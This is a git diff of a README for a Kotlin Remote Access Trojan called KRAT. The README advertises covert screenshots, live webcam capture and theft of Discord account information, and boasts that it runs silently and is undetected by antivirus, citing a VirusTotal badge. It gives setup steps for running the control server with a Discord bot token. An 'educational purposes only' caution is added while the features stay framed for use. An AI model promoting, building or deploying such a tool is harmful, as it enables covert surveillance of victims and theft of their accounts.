@@ -1,3 +1,6 @@
+> [!CAUTION]
+> Educational purposes only.
+
 ### Current status: 🟢[Undetected](https://www.virustotal.com/gui/file/4010a8370f3473ba80ddc202cca45f5d310b344ed2e773989aff003cbea71495?nocache=1)
 
 # KRAT
@@ -5,18 +8,19 @@
 A RAT (Remote Access Trojan) written in Kotlin.
 
 ## Features
-- Get periodicals screenshots
-- Get real-time webcam
-- Sends Discord account information
-- On-demand actions
+- Periodicals screenshots
+- Real-time webcam
+- Discord account information
+- Several on-demand actions
 - Everything silently and undetectable by antivirus
 
 ## Usage
 1. Download the latest release and put it on a server
-2. Run the `KRAT-server.jar` file with your Discord bot token as parameter
+2. Configure the `DISCORD_BOT_TOKEN` environment variable to your bot token
+3. Run the `KRAT-server.jar` file with your Discord bot token as parameter
 
 ```sh
-java -jar KRAT-server.jar <bot-token>
+java -jar KRAT-server.jar
 ```
 
 ## On-demand actions
@@ -31,6 +35,18 @@ java -jar KRAT-server.jar <bot-token>
 
 [//]: # (3. The program will connect to your Discord bot and ask for configuration)
 
+## Multiplatform compatibility
+The project aims to be multiplatform, 
+it can be compiled to run on any OS that has JVM.
+
+| OS      | Supported |
+|---------|-----------|
+| Windows | ✅         |
+| Linux   | ✅         |
+| macOS   | ✅         |
+| Android | ❌         |
+| iOS     | ❌         |
+
 ## Stack
 - [Kotlin](https://kotlinlang.org/)
 - [Coroutines](https://github.com/Kotlin/kotlinx.coroutines) (asynchronous programming)
@@ -38,12 +54,3 @@ java -jar KRAT-server.jar <bot-token>
 - [DiscordKt](https://github.com/DiscordKt/DiscordKt)
 - [Kord](https://kordlib.github.io/kord/)
 - [webcam-capture](https://github.com/sarxos/webcam-capture)
-
-## Tailored software
-Do you need private software customized to your specific needs?
-
-Contact me on Discord : **_@lished_**
-
-## Disclaimer
-
-Educational purposes only.
